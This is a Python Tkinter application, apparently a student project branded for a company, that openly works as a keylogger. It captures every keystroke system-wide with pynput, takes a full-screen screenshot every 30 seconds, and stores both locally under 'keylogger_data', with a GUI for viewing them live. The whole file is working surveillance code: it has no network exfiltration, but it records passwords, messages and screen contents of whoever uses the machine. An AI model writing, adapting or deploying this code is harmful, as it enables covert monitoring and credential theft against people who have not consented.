import os
import time
import threading
from datetime import datetime
from pynput.keyboard import Key, Listener
from PIL import Image, ImageTk, ImageGrab
import tkinter as tk
from tkinter import messagebox
import glob


class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SYSTEM MONITORING TOOL")
        self.root.geometry("1000x700")
        self.root.configure(bg="#2c3e50")

        # Initialize variables
        self.is_running = False
        self.listener = None
        self.screenshot_thread = None
        self.timer_thread = None
        self.current_text = ""
        self.log_file_path = os.path.join("keylogger_data", "keystrokes.txt")
        self.word_count = 0
        self.line_count = 0
        self.start_time = None
        self.elapsed_time = "00:00:00"

        # Create directories
        self.create_directories()

        # Setup GUI
        self.setup_gui()

        # Update display periodically
        self.update_display()

    def create_directories(self):
        if not os.path.exists("keylogger_data"):
            os.makedirs("keylogger_data")
        if not os.path.exists("keylogger_data/screenshots"):
            os.makedirs("keylogger_data/screenshots")

    def setup_gui(self):
        main_frame = tk.Frame(self.root, bg="#2c3e50")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        title_label = tk.Label(
            main_frame,
            text="BALASORE  ALLOYS  LIMITED",
            font=("Arial", 20, "bold"),
            fg="#ecf0f1",
            bg="#2c3e50"
        )
        title_label.pack(pady=(0, 10))

        control_frame = tk.Frame(main_frame, bg="#2c3e50")
        control_frame.pack(fill=tk.X, pady=(0, 10))

        # LEFT: Logo
        logo_frame = tk.Frame(control_frame, bg="#2c3e50")
        logo_frame.pack(side=tk.LEFT, fill=tk.Y)
        try:
            logo_path = r"C:\Users\user\Desktop\Final Project\logo.png"
            logo_img = Image.open(logo_path)
            logo_img = logo_img.resize((200, 200), Image.Resampling.LANCZOS)
            self.logo_photo = ImageTk.PhotoImage(logo_img)
            logo_label = tk.Label(logo_frame, image=self.logo_photo, bg="#2c3e50")
            logo_label.pack(padx=10, pady=5)
        except Exception:
            logo_label = tk.Label(
                logo_frame,
                text="LOGO\nNOT\nFOUND",
                font=("Arial", 8),
                fg="#e74c3c",
                bg="#2c3e50",
                width=10,
                height=4,
                relief="raised",
                bd=2
            )
            logo_label.pack(padx=10, pady=5)

        # RIGHT: Buttons
        button_frame = tk.Frame(control_frame, bg="#2c3e50")
        button_frame.pack(side=tk.RIGHT)

        self.start_stop_btn = tk.Button(
            button_frame,
            text="START KEYLOGGER",
            command=self.toggle_keylogger,
            font=("Arial", 12, "bold"),
            bg="#27ae60",
            fg="white",
            width=20,
            height=2
        )
        self.start_stop_btn.pack(side=tk.LEFT, padx=(0, 10))

        clear_btn = tk.Button(
            button_frame,
            text="CLEAR DATA",
            command=self.clear_data,
            font=("Arial", 12, "bold"),
            bg="#e74c3c",
            fg="white",
            width=15,
            height=2
        )
        clear_btn.pack(side=tk.LEFT, padx=(0, 10))

        folder_btn = tk.Button(
            button_frame,
            text="OPEN FOLDER",
            command=self.open_data_folder,
            font=("Arial", 12, "bold"),
            bg="#3498db",
            fg="white",
            width=15,
            height=2
        )
        folder_btn.pack(side=tk.LEFT)

        stats_frame = tk.LabelFrame(
            main_frame,
            text="Statistics",
            font=("Arial", 12, "bold"),
            fg="#ecf0f1",
            bg="#34495e"
        )
        stats_frame.pack(fill=tk.X, pady=(0, 10))

        stats_inner = tk.Frame(stats_frame, bg="#34495e")
        stats_inner.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(
            stats_inner,
            text="Timer:",
            font=("Arial", 14, "bold"),
            fg="#ecf0f1",
            bg="#34495e"
        ).grid(row=0, column=0, sticky="w")
        self.timer_label = tk.Label(
            stats_inner,
            text="00:00:00",
            font=("Arial", 14, "bold"),
            fg="#f39c12",
            bg="#34495e"
        )
        self.timer_label.grid(row=0, column=1, sticky="w", padx=(10, 20))

        tk.Label(
            stats_inner,
            text="Words:",
            font=("Arial", 14, "bold"),
            fg="#ecf0f1",
            bg="#34495e"
        ).grid(row=0, column=2, sticky="w")
        self.word_count_label = tk.Label(
            stats_inner,
            text="0",
            font=("Arial", 14),
            fg="#2ecc71",
            bg="#34495e"
        )
        self.word_count_label.grid(row=0, column=3, sticky="w", padx=(10, 20))

        tk.Label(
            stats_inner,
            text="Lines:",
            font=("Arial", 14, "bold"),
            fg="#ecf0f1",
            bg="#34495e"
        ).grid(row=0, column=4, sticky="w")
        self.line_count_label = tk.Label(
            stats_inner,
            text="0",
            font=("Arial", 14),
            fg="#2ecc71",
            bg="#34495e"
        )
        self.line_count_label.grid(row=0, column=5, sticky="w", padx=(10, 20))

        tk.Label(
            stats_inner,
            text="Status:",
            font=("Arial", 14, "bold"),
            fg="#ecf0f1",
            bg="#34495e"
        ).grid(row=0, column=6, sticky="w")
        self.status_label = tk.Label(
            stats_inner,
            text="STOPPED",
            font=("Arial", 14),
            fg="#e74c3c",
            bg="#34495e"
        )
        self.status_label.grid(row=0, column=7, sticky="w", padx=(10, 0))

        content_frame = tk.Frame(main_frame, bg="#2c3e50")
        content_frame.pack(fill=tk.BOTH, expand=True)

        # Left: Text display
        left_panel = tk.LabelFrame(
            content_frame,
            text="Captured Text (Real-time)",
            font=("Arial", 12, "bold"),
            fg="#ecf0f1",
            bg="#34495e"
        )
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))

        self.text_display = tk.Text(
            left_panel,
            wrap=tk.WORD,
            font=("Consolas", 12),
            bg="#2c3e50",
            fg="#ecf0f1",
            state=tk.DISABLED,
            cursor="arrow"
        )
        self.text_display.bind("<Key>", lambda e: "break")
        text_scrollbar = tk.Scrollbar(left_panel, orient=tk.VERTICAL, command=self.text_display.yview)
        self.text_display.configure(yscrollcommand=text_scrollbar.set)
        self.text_display.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        text_scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)

        # Right: Screenshot previews
        right_panel = tk.LabelFrame(
            content_frame,
            text="Screenshots",
            font=("Arial", 12, "bold"),
            fg="#ecf0f1",
            bg="#34495e"
        )
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))

        screenshot_container = tk.Frame(right_panel, bg="#34495e")
        screenshot_container.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.screenshot_canvas = tk.Canvas(
            screenshot_container,
            bg="#2c3e50",
            highlightthickness=0
        )
        scrollbar = tk.Scrollbar(
            screenshot_container,
            orient=tk.VERTICAL,
            command=self.screenshot_canvas.yview
        )
        self.scrollable_frame = tk.Frame(self.screenshot_canvas, bg="#2c3e50")

        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.screenshot_canvas.configure(scrollregion=self.screenshot_canvas.bbox("all"))
        )
        self.screenshot_canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        self.screenshot_canvas.configure(yscrollcommand=scrollbar.set)
        self.screenshot_canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        self.screenshot_canvas.bind("<MouseWheel>", self._on_mousewheel)
        self.screenshot_widgets = []

    def _on_mousewheel(self, event):
        self.screenshot_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

    def update_screenshot_previews(self):
        try:
            for widget in self.screenshot_widgets:
                widget.destroy()
            self.screenshot_widgets.clear()

            files = glob.glob(os.path.join("keylogger_data", "screenshots", "*.png"))
            files.sort(reverse=True)

            for file_path in files:
                filename = os.path.basename(file_path)
                preview_frame = tk.Frame(self.scrollable_frame, bg="#34495e", relief="raised", bd=1)
                preview_frame.pack(fill=tk.X, padx=2, pady=2)

                try:
                    img = Image.open(file_path)
                    img.thumbnail((200, 150), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    img_label = tk.Label(preview_frame, image=photo, bg="#34495e", cursor="hand2")
                    img_label.image = photo
                    img_label.pack(side=tk.LEFT, padx=5, pady=5)
                    img_label.bind("<Button-1>", lambda e, p=file_path: self.open_file(p))
                    img_label.bind("<Double-Button-1>", lambda e, p=file_path: self.preview_file(p))
                except Exception:
                    img_label = tk.Label(
                        preview_frame,
                        text="IMAGE\nERROR",
                        font=("Arial", 8),
                        fg="#e74c3c",
                        bg="#34495e",
                        width=15,
                        height=5
                    )
                    img_label.pack(side=tk.LEFT, padx=5, pady=5)

                info_frame = tk.Frame(preview_frame, bg="#34495e")
                info_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)

                disp_name = filename if len(filename) <= 25 else filename[:22] + "..."
                name_label = tk.Label(
                    info_frame,
                    text=disp_name,
                    font=("Arial", 9, "bold"),
                    fg="#ecf0f1",
                    bg="#34495e",
                    anchor="w"
                )
                name_label.pack(anchor="w")

                try:
                    stat = os.stat(file_path)
                    size_mb = stat.st_size / (1024 * 1024)
                    mod_time = datetime.fromtimestamp(stat.st_mtime).strftime("%H:%M:%S")
                    info_label = tk.Label(
                        info_frame,
                        text=f"Size: {size_mb:.1f}MB\nTime: {mod_time}",
                        font=("Arial", 10),
                        fg="#bdc3c7",
                        bg="#34495e",
                        anchor="w",
                        justify="left"
                    )
                    info_label.pack(anchor="w")
                except Exception:
                    info_label = tk.Label(
                        info_frame,
                        text="Info unavailable",
                        font=("Arial", 7),
                        fg="#e74c3c",
                        bg="#34495e"
                    )
                    info_label.pack(anchor="w")

                btn_frame = tk.Frame(info_frame, bg="#34495e")
                btn_frame.pack(anchor="w", pady=2)

                open_btn = tk.Button(
                    btn_frame,
                    text="Open",
                    font=("Arial", 7),
                    bg="#3498db",
                    fg="white",
                    width=6,
                    command=lambda p=file_path: self.open_file(p)
                )
                open_btn.pack(side=tk.LEFT, padx=(0, 2))

                prev_btn = tk.Button(
                    btn_frame,
                    text="Preview",
                    font=("Arial", 7),
                    bg="#9b59b6",
                    fg="white",
                    width=6,
                    command=lambda p=file_path: self.preview_file(p)
                )
                prev_btn.pack(side=tk.LEFT)

                self.screenshot_widgets.extend([
                    preview_frame, img_label, info_frame, name_label,
                    info_label, btn_frame, open_btn, prev_btn
                ])
        except Exception as e:
            print(f"Error updating previews: {e}")

    def open_file(self, path):
        try:
            os.startfile(path)
        except Exception as e:
            messagebox.showerror("Error", f"Cannot open file: {e}")

    def preview_file(self, path):
        try:
            win = tk.Toplevel(self.root)
            win.title(f"Preview: {os.path.basename(path)}")
            win.geometry("800x600")
            win.configure(bg="#2c3e50")
            img = Image.open(path)
            img.thumbnail((780, 580), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            lbl = tk.Label(win, image=photo, bg="#2c3e50")
            lbl.image = photo
            lbl.pack(expand=True)
        except Exception as e:
            messagebox.showerror("Error", f"Cannot preview file: {e}")

    def toggle_keylogger(self):
        if not self.is_running:
            self.start_keylogger()
        else:
            self.stop_keylogger()

    def start_keylogger(self):
        try:
            self.is_running = True
            self.start_time = time.time()
            self.start_stop_btn.config(text="STOP KEYLOGGER", bg="#e74c3c")
            self.status_label.config(text="RUNNING", fg="#2ecc71")
            self.current_text = ""
            self.update_text_display()

            self.listener = Listener(on_press=self.process_key)
            self.listener.start()

            self.screenshot_thread = threading.Thread(target=self.capture_screenshots, daemon=True)
            self.screenshot_thread.start()

            self.timer_thread = threading.Thread(target=self.update_timer, daemon=True)
            self.timer_thread.start()

            messagebox.showinfo("Success", "Keylogger started!")
        except Exception as e:
            messagebox.showerror("Error", f"Start failed: {e}")
            self.is_running = False

    def stop_keylogger(self):
        try:
            self.is_running = False
            self.start_stop_btn.config(text="START KEYLOGGER", bg="#27ae60")
            self.status_label.config(text="STOPPED", fg="#e74c3c")
            if self.listener:
                self.listener.stop()
            if self.current_text.strip():
                self.write_to_file(self.current_text)
            messagebox.showinfo("Success", "Keylogger stopped!")
        except Exception as e:
            messagebox.showerror("Error", f"Stop failed: {e}")

    def process_key(self, key):
        try:
            if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r,
                       Key.alt, Key.alt_l, Key.alt_r,
                       Key.shift, Key.shift_l, Key.shift_r):
                name = str(key).replace("Key.", "")
                self.current_text += f"[{name}]"
            elif key == Key.backspace:
                self.current_text += "[backspace]"
            elif key == Key.space:
                self.current_text += " "
            elif key == Key.enter:
                self.current_text += "\n"
                self.line_count += 1
            else:
                vk = getattr(key, "vk", None)
                if vk is not None and 96 <= vk <= 105:
                    self.current_text += str(vk - 96)
                elif hasattr(key, "char") and key.char:
                    self.current_text += key.char
                else:
                    name = str(key).replace("Key.", "")
                    self.current_text += f"[{name}]"
            self.update_text_display_realtime()
            self.word_count = len([w for w in self.current_text.split() if w.strip()])
        except Exception as e:
            print(f"Key error: {e}")

    def update_text_display_realtime(self):
        self.root.after(0, self.update_text_display)

    def update_text_display(self):
        try:
            self.text_display.config(state=tk.NORMAL)
            self.text_display.delete(1.0, tk.END)
            self.text_display.insert(1.0, self.current_text)
            self.text_display.see(tk.END)
            self.text_display.config(state=tk.DISABLED)
        except Exception as e:
            print(f"Display error: {e}")

    def update_timer(self):
        while self.is_running:
            try:
                elapsed = time.time() - self.start_time
                h = int(elapsed // 3600)
                m = int((elapsed % 3600) // 60)
                s = int(elapsed % 60)
                self.elapsed_time = f"{h:02d}:{m:02d}:{s:02d}"
                self.root.after(0, lambda: self.timer_label.config(text=self.elapsed_time))
                time.sleep(1)
            except:
                break

    def write_to_file(self, text):
        try:
            with open(self.log_file_path, "w", encoding="utf-8") as f:
                f.write(text)
        except Exception as e:
            print(f"I/O error: {e}")

    def capture_screenshots(self):
        while self.is_running:
            try:
                screenshot = ImageGrab.grab()
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                fn = f"screenshot_{ts}.png"
                path = os.path.join("keylogger_data", "screenshots", fn)
                screenshot.save(path)
                time.sleep(30)
            except Exception as e:
                print(f"Screenshot error: {e}")
                time.sleep(30)

    def update_display(self):
        try:
            self.word_count_label.config(text=str(self.word_count))
            self.line_count_label.config(text=str(self.line_count))
            self.update_screenshot_previews()
        except Exception as e:
            print(f"Update error: {e}")
        self.root.after(5000, self.update_display)

    def clear_data(self):
        if messagebox.askyesno("Confirm", "Are you sure you want to clear all data?"):
            try:
                open(self.log_file_path, "w").close()
                for f in glob.glob(os.path.join("keylogger_data", "screenshots", "*.png")):
                    os.remove(f)
                self.current_text = ""
                self.elapsed_time = "00:00:00"
                self.word_count = 0
                self.line_count = 0
                self.update_text_display()
                if not self.is_running:
                    self.timer_label.config(text="00:00:00")
                messagebox.showinfo("Success", "All data cleared!")
            except Exception as e:
                messagebox.showerror("Error", f"Clear failed: {e}")

    def open_data_folder(self):
        try:
            os.startfile("keylogger_data")
        except Exception as e:
            messagebox.showerror("Error", f"Cannot open folder: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
